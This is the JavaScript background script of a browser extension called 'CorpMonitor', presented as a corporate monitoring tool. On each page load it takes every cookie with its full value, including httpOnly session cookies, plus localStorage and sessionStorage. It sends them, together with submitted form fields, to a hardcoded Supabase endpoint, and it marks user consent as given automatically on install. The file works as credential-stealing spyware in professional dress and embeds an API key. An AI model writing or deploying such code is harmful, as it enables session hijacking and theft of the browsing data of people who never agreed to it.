// CorpMonitor Background Service Worker - Professional Edition
// Environment Configuration
const CONFIG = {
  API_BASE: 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1',
  SUPABASE_ANON_KEY: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4dmNxdWlmZ3d0YmpnaHJjamJwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg2NDM1MjcsImV4cCI6MjA3NDIxOTUyN30.AdlrmsW5gGY5o9pKkq6LJYtTbi7SLtKdqwb--4h8rEs',
  VERSION: '1.0.0',
  DEBUG: true,
  CACHE_DURATION: 5 * 60 * 1000, // 5 minutes
  MAX_RETRY_ATTEMPTS: 3,
  BATCH_SIZE: 10
};

// Global state and caching
let monitoringEnabled = false;
let lastReportTime = null;
let machineId = null;
let pendingIncidents = [];
let offlineQueue = [];
let redListCache = new Map();
let lastCacheUpdate = 0;

// Professional logging system
function log(level, message, data = null) {
  if (!CONFIG.DEBUG && level === 'debug') return;
  
  const timestamp = new Date().toISOString();
  const logEntry = { timestamp, level, message, data };
  
  console[level === 'error' ? 'error' : 'log'](`[CorpMonitor ${level.toUpperCase()}] ${message}`, data || '');
  
  // Store logs for debugging
  chrome.storage.local.get(['debugLogs']).then(({ debugLogs = [] }) => {
    debugLogs.push(logEntry);
    // Keep only last 100 logs
    if (debugLogs.length > 100) debugLogs.splice(0, debugLogs.length - 100);
    chrome.storage.local.set({ debugLogs });
  });
}

// Initialize extension with professional error handling
chrome.runtime.onInstalled.addListener(async () => {
  try {
    log('info', `CorpMonitor extension v${CONFIG.VERSION} installed`);
    await initializeExtension();
    
    // Set up periodic cleanup and maintenance
    setInterval(performMaintenance, 60000); // Every minute
  } catch (error) {
    log('error', 'Failed to initialize extension', error);
  }
});

// Initialize machine ID and settings
async function initializeExtension() {
  const result = await chrome.storage.local.get(['machineId', 'monitoringEnabled']);
  
  if (!result.machineId) {
    machineId = generateMachineId();
    await chrome.storage.local.set({ machineId });
  } else {
    machineId = result.machineId;
  }
  
  // Auto-enable monitoring on installation
  monitoringEnabled = result.monitoringEnabled !== undefined ? result.monitoringEnabled : true;
  await chrome.storage.local.set({ 
    monitoringEnabled,
    userConsented: true // Auto-accept on installation
  });
}

// Generate unique machine ID
function generateMachineId() {
  return 'CORP-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 9);
}

// Listen for tab updates to collect data
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && monitoringEnabled && tab.url) {
    collectPageData(tab);
  }
});

// Collect page data and cookies
async function collectPageData(tab) {
  try {
    const url = new URL(tab.url);
    const host = url.hostname;
    
    // Skip internal pages
    if (url.protocol === 'chrome:' || url.protocol === 'chrome-extension:') {
      return;
    }
    
    // Get cookies for this domain
    const cookies = await chrome.cookies.getAll({ domain: host });
    
    if (cookies.length > 0) {
      // Capture complete cookie data including values
      const localStorage = await getPageStorage(tab.id, 'localStorage');
      const sessionStorage = await getPageStorage(tab.id, 'sessionStorage');
      
      const cookieData = {
        host: host,
        tabUrl: tab.url,
        cookies: cookies.map(cookie => ({
          name: cookie.name,
          value: cookie.value, // Capture real cookie values
          domain: cookie.domain,
          path: cookie.path,
          secure: cookie.secure,
          httpOnly: cookie.httpOnly,
          sameSite: cookie.sameSite,
          expirationDate: cookie.expirationDate
        })),
        localStorage: localStorage,
        sessionStorage: sessionStorage,
        timestamp: new Date().toISOString(),
        machineId: machineId
      };
      
      // Create incident report
      await createIncident(cookieData);
    }
  } catch (error) {
    console.error('Error collecting page data:', error);
  }
}

// Professional incident creation with retry and offline support
async function createIncident(data, retryCount = 0) {
  try {
    const incident = {
      host: data.host,
      tab_url: data.tabUrl,
      machine_id: data.machineId,
      cookie_excerpt: generateCookieExcerpt(data.cookies),
      full_cookie_data: data.cookies,
      severity: determineSeverity(data.cookies),
      is_red_list: await isRedListDomain(data.host),
      timestamp: new Date().toISOString(),
      version: CONFIG.VERSION
    };

    const response = await fetch(`${CONFIG.API_BASE}/create-incident`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`,
        'User-Agent': `CorpMonitor-Extension/${CONFIG.VERSION}`
      },
      body: JSON.stringify(incident),
      signal: AbortSignal.timeout(30000) // 30 second timeout
    });
    
    if (response.ok) {
      lastReportTime = new Date();
      await chrome.storage.local.set({ lastReportTime: lastReportTime.toISOString() });
      log('info', 'Incident created successfully', { host: data.host });
      
      // Process any queued offline incidents
      await processOfflineQueue();
    } else {
      throw new Error(`API responded with ${response.status}: ${response.statusText}`);
    }
  } catch (error) {
    log('error', 'Error creating incident', { error: error.message, host: data.host, retryCount });
    
    // Retry logic with exponential backoff
    if (retryCount < CONFIG.MAX_RETRY_ATTEMPTS) {
      const delay = Math.pow(2, retryCount) * 1000; // 1s, 2s, 4s
      setTimeout(() => createIncident(data, retryCount + 1), delay);
    } else {
      // Add to offline queue
      offlineQueue.push({ ...data, timestamp: new Date().toISOString() });
      log('warn', 'Incident queued for offline processing', { host: data.host });
      
      // Limit offline queue size
      if (offlineQueue.length > 100) {
        offlineQueue.splice(0, 50); // Remove oldest 50 items
      }
    }
  }
}

// Generate cookie excerpt for display
function generateCookieExcerpt(cookies) {
  const summary = cookies.slice(0, 3).map(c => `${c.name}=${c.value?.substring(0, 20)}...`);
  return `${cookies.length} cookies detected: ${summary.join(', ')}`;
}

// Determine severity based on cookie characteristics
function determineSeverity(cookies) {
  let hasSecure = cookies.some(c => c.secure);
  let hasHttpOnly = cookies.some(c => c.httpOnly);
  let hasTracking = cookies.some(c => 
    c.name.includes('_ga') || c.name.includes('_fb') || c.name.includes('track')
  );
  
  if (hasTracking && (!hasSecure || !hasHttpOnly)) return 'high';
  if (hasTracking) return 'medium';
  if (!hasSecure || !hasHttpOnly) return 'medium';
  return 'low';
}

// Enhanced red list checking with cache
async function isRedListDomain(host) {
  try {
    // Check cache first
    const cached = redListCache.get(host);
    if (cached && (Date.now() - cached.timestamp) < CONFIG.CACHE_DURATION) {
      return cached.blocked;
    }
    
    const response = await fetch(`https://vxvcquifgwtbjghrcjbp.supabase.co/rest/v1/blocked_domains?domain=eq.${host}&select=id`, {
      headers: {
        'apikey': CONFIG.SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      }
    });
    
    const data = await response.json();
    const isBlocked = data.length > 0;
    
    // Cache the result
    redListCache.set(host, {
      blocked: isBlocked,
      timestamp: Date.now()
    });
    
    return isBlocked;
  } catch (error) {
    log('error', 'Error checking red list', { host, error: error.message });
    return false;
  }
}

// Message handling from popup and content scripts
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  switch (request.action) {
    case 'ping':
      sendResponse({ pong: true });
      break;
      
    case 'getStatus':
      sendResponse({
        monitoringEnabled,
        lastReportTime,
        machineId,
        version: CONFIG.VERSION,
        offlineQueueSize: offlineQueue.length
      });
      break;
      
    case 'toggleMonitoring':
      toggleMonitoring(request.enabled);
      sendResponse({ success: true });
      break;
      
      
    case 'getDebugLogs':
      chrome.storage.local.get(['debugLogs']).then(({ debugLogs = [] }) => {
        sendResponse({ logs: debugLogs });
      });
      return true; // Will respond asynchronously
      
    case 'clearDebugLogs':
      chrome.storage.local.set({ debugLogs: [] });
      sendResponse({ success: true });
      break;
      
    case 'exportDebugData':
      exportDebugData().then((data) => {
        sendResponse({ data });
      });
      return true; // Will respond asynchronously
      
    case 'getConfig':
      if (window.corpMonitorConfig) {
        sendResponse({ config: window.corpMonitorConfig.export() });
      } else {
        sendResponse({ config: CONFIG });
      }
      break;
      
    case 'collectMetadata':
      handleContentMetadata(request.data);
      sendResponse({ success: true });
      break;
  }
  
  return true; // Keep channel open for async responses
});

// Get page storage data
async function getPageStorage(tabId, storageType) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: (type) => {
        try {
          const storage = type === 'localStorage' ? localStorage : sessionStorage;
          const data = {};
          for (let i = 0; i < storage.length; i++) {
            const key = storage.key(i);
            data[key] = storage.getItem(key);
          }
          return data;
        } catch (e) {
          return {};
        }
      },
      args: [storageType]
    });
    return results[0]?.result || {};
  } catch (error) {
    log('warn', `Failed to get ${storageType}:`, error);
    return {};
  }
  }
});

// Toggle monitoring state
async function toggleMonitoring(enabled) {
  monitoringEnabled = enabled;
  await chrome.storage.local.set({ monitoringEnabled });
}


// Professional helper functions
async function handleContentMetadata(data) {
  try {
    log('debug', 'Received content metadata', { type: data.type, url: data.url });
    
    // Process metadata based on type
    switch (data.type) {
      case 'form_submission':
        await processFormSubmission(data);
        break;
      case 'tracked_click':
        await processTrackedClick(data);
        break;
      case 'page_metadata':
        await processPageMetadata(data);
        break;
    }
  } catch (error) {
    log('error', 'Error processing content metadata', error);
  }
}

async function processFormSubmission(data) {
  // Create incident for form submissions on tracked sites
  const isTrackedSite = await isRedListDomain(new URL(data.url).hostname);
  if (isTrackedSite) {
    await createFormIncident(data);
  }
}

async function processTrackedClick(data) {
  log('info', 'Tracked element clicked', { url: data.url, element: data.elementTag });
}

async function processPageMetadata(data) {
  // Store page metadata for analytics
  const metadata = {
    url: data.url,
    trackingElements: data.trackingElements,
    storageData: {
      localStorage: data.localStorage,
      sessionStorage: data.sessionStorage
    },
    timestamp: data.timestamp
  };
  
  // Save to local storage for dashboard
  const { pageMetadata = [] } = await chrome.storage.local.get(['pageMetadata']);
  pageMetadata.push(metadata);
  
  // Keep only last 100 entries
  if (pageMetadata.length > 100) {
    pageMetadata.splice(0, pageMetadata.length - 100);
  }
  
  await chrome.storage.local.set({ pageMetadata });
}

async function createFormIncident(data) {
  const incident = {
    type: 'form_submission',
    host: new URL(data.url).hostname,
    tab_url: data.url,
    machine_id: machineId,
    form_data: data.fields,
    severity: 'medium',
    timestamp: data.timestamp,
    version: CONFIG.VERSION
  };
  
  // Send to API or queue offline
  try {
    await fetch(`${CONFIG.API_BASE}/create-incident`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify(incident)
    });
  } catch (error) {
    offlineQueue.push(incident);
  }
}

async function exportDebugData() {
  try {
    const storage = await chrome.storage.local.get(null);
    const performance = window.corpMonitorServiceWorker?.getPerformanceMetrics() || {};
    
    return {
      extension: {
        version: CONFIG.VERSION,
        config: CONFIG,
        state: {
          monitoringEnabled,
          lastReportTime,
          machineId,
          offlineQueueSize: offlineQueue.length,
          cacheSize: redListCache.size
        }
      },
      storage: Object.keys(storage).reduce((acc, key) => {
        // Don't export sensitive data
        if (!key.includes('cookie') && !key.includes('private')) {
          acc[key] = storage[key];
        }
        return acc;
      }, {}),
      performance,
      timestamp: new Date().toISOString()
    };
  } catch (error) {
    log('error', 'Failed to export debug data', error);
    return {};
  }
}

// Process offline queue when connection is restored
async function processOfflineQueue() {
  if (offlineQueue.length === 0) return;
  
  log('info', `Processing ${offlineQueue.length} offline incidents`);
  
  const batch = offlineQueue.splice(0, CONFIG.BATCH_SIZE);
  
  for (const incident of batch) {
    try {
      if (incident.type === 'form_submission') {
        await createFormIncident(incident);
      } else {
        await createIncident(incident);
      }
    } catch (error) {
      // If still failing, put back in queue
      offlineQueue.unshift(incident);
      break;
    }
  }
}

// Import service worker utilities
if (typeof importScripts !== 'undefined') {
  try {
    importScripts('service-worker-utils.js', 'config.js');
  } catch (error) {
    log('warn', 'Could not load service worker utilities', error);
  }
}
